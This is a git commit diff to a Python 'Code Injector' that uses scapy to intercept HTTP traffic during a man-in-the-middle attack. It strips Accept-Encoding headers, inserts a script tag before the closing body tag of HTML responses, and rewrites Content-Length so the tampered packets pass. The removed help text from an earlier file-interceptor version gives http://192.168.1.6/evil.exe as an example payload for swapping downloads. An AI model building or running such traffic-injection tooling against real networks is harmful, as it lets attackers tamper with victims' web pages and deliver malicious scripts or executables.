b7748fe0b2facb417967b12e8397d7ab2aa8f2d9
danericp <40313553+danericp@users.noreply.github.com>
2023-11-26 03:01:05 +0000

    Update main.py

--- code-injector/main.py
+++ code-injector/main.py
@@ -10,44 +10,52 @@ int_port_http = 80
 def do_packet_process(packet):
     ## Referenced from file-interceptor
     obj_packet_scapy = scapy.IP(packet.get_payload())
-    if obj_packet_scapy.haslayer(scapy.Raw) and obj_packet_scapy.haslayer(scapy.TCP):
-        obj_load = obj_packet_scapy[scapy.Raw].load
-        
-        ## HTTP Request/Response Criteria
-        ## If Source Port (sport) is 42846 (tcp/udp) and Destination Port (dport) is http (80) => Request
-        ## If Source Port (sport) is http (80) and Destination Port (dport) is 42846 (tcp/udp) => Response
-        ## Check if TCP dport (Destination Port) is HTTP, hence request
-        if obj_packet_scapy[scapy.TCP].dport == int_port_http:
-            print("💠 Request (Port " + int_port_http + ")")
+    # print(obj_packet_scapy.show())
+    
+    if obj_packet_scapy.haslayer(scapy.Raw):
+
+        try:
+            obj_load = obj_packet_scapy[scapy.Raw].load.decode()
+
+            ## HTTP Request/Response Criteria
+            ## If Source Port (sport) is 42846 (tcp/udp) and Destination Port (dport) is http (80) => Request
+            ## If Source Port (sport) is http (80) and Destination Port (dport) is 42846 (tcp/udp) => Response
+            ## Check if TCP dport (Destination Port) is HTTP, hence request
+            if obj_packet_scapy[scapy.TCP].dport == int_port_http:
+                # print("💠 Request (Port " + str(int_port_http) + ")")
+                ## Substitute Header Content using Regex (re) module
+                ## Erasing Accept-Encoding: gzip, so the server will not encrypt the Response Raw load
+                # print("❗ Erasing Accept-Encoding Property")
+                obj_load = re.sub("Accept-Encoding:.*?\\r\\n", "", obj_load)
+
+            ## Check if TCP dport (Destination Port) is HTTP, hence response 
+            elif obj_packet_scapy[scapy.TCP].sport == int_port_http:
+                print("💠 Response (Port " + str(int_port_http) + ")")
+                # print(obj_packet_scapy.show())
+                # print("❗ Injecting an Alert")
+                str_code_inject = "<script>alert('" + obj_options.payload + "')</script>"
+                obj_load = obj_load.replace("</body>", str_code_inject + "</body>")
+                # print("ℹ️ " + obj_load)
+                str_regex_content_length = re.search("(?:Content-Length:\s)\d*", obj_load)
             
-            ## Substitute Header Content using Regex (re) module
-            ## Erasing Accept-Encoding: gzip, so the server will not encrypt the Response Raw load
-            # print("❗ Erasing Accept-Encoding Property")
-            obj_load = re.sub("Accept-Encoding:.*?\\r\\n", "", obj_load)
+                ## If a Content-Length value was found and the load is HTML-based
+                if str_regex_content_length and "text/html" in obj_load:
+                    str_content_length = str_regex_content_length.group(0).split(':')[1].strip()
+                    int_content_length_new = int(str_content_length) + len(str_code_inject)
+                    print("ℹ️ Original Content-Length:" + str_content_length)
+                    print("ℹ️ Newly modified Content-Length:" + str(int_content_length_new))
+                    obj_load = obj_load.replace(str_content_length, str(int_content_length_new))
         
-        ## Check if TCP dport (Destination Port) is HTTP, hence response 
-        elif obj_packet_scapy[scapy.TCP].sport == int_port_http:
-            print("💠 Response (Port " + int_port_http + ")")
-            # print(obj_packet_scapy.show())
-            
-            # print("❗ Injecting an Alert")
-            str_code_inject = "<script>alert('test')</script>"
-            obj_load = obj_load.replace("</body>", str_code_inject + "</body>")
-            str_regex_content_length = re.search("(?:Content-Length:\s)\d*", obj_load)
-            ## If a Content-Length value was found and the load is HTML-based
-            if str_regex_content_length and "text/html" in obj_load:
-                str_content_length = str_regex_content_length.group(1)
-                int_content_length_new = int(str_content_length) + len(str_code_inject)
-                # print("ℹ️ " + str_content_length)
-                # print("ℹ️ " + str(int_content_length_new))
-                obj_load = obj_load.replace(str_content_length, str(int_content_length_new))
-        
-        ## Proceed to Packet/Code Injection if there are discrepancies based on the original payload
-        if obj_load != obj_packet_scapy[scapy.Raw].load:
-            ## Inject the Payload inside the Packet (Code Injection)
-            print("❗ Changes have been found in the Raw content. Setting the payload")
-            obj_packet_scapy_new = do_payload_set(obj_packet_scapy, obj_load)
-            packet.set_payload(bytes(obj_packet_scapy_new))
+            ## Proceed to Packet/Code Injection if there are discrepancies based on the original payload
+            if obj_load != obj_packet_scapy[scapy.Raw].load.decode():
+                ## Inject the Payload inside the Packet (Code Injection)
+                print("❗ Changes have been found in the Raw content. Setting the payload")
+                obj_packet_scapy_new = do_payload_set(obj_packet_scapy, obj_load)
+                packet.set_payload(bytes(obj_packet_scapy_new))
+
+        except UnicodeDecodeError:
+            pass
+
     ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
     packet.accept()
     # packet.drop()
@@ -63,12 +71,11 @@ def do_payload_set(obj_packet, str_payload):
 
 def get_arguments():
     obj_parser = argparse.ArgumentParser(
-        prog = 'File Interceptor',
-        description = 'Intercepts Payload via MITM.',
-        epilog = 'Tested in http://www.speedbit.com/ and Windows Server'
+        prog = 'Code Injector',
+        description = 'Intercepts HTTP Responses via MITM.',
+        epilog = 'Tested in http://www.speedbit.com/, Windows Server and Parrot OS'
     )
-    obj_parser.add_argument("-e", "--extension", dest="ext", help="Extension of the expected payload (E.g. .exe, .rar, .zip)", required=True)
-    obj_parser.add_argument("-p", "--payload", dest="payload", help="Payload file Absolute Path (E.g. http://192.168.1.6/evil.exe https://www.7-zip.org/a/7z2301-x64.exe)", required=True)
+    obj_parser.add_argument("-p", "--payload-alert", dest="payload", help="Javascript Alert Message", required=True)
     options = obj_parser.parse_args()
     return options
 
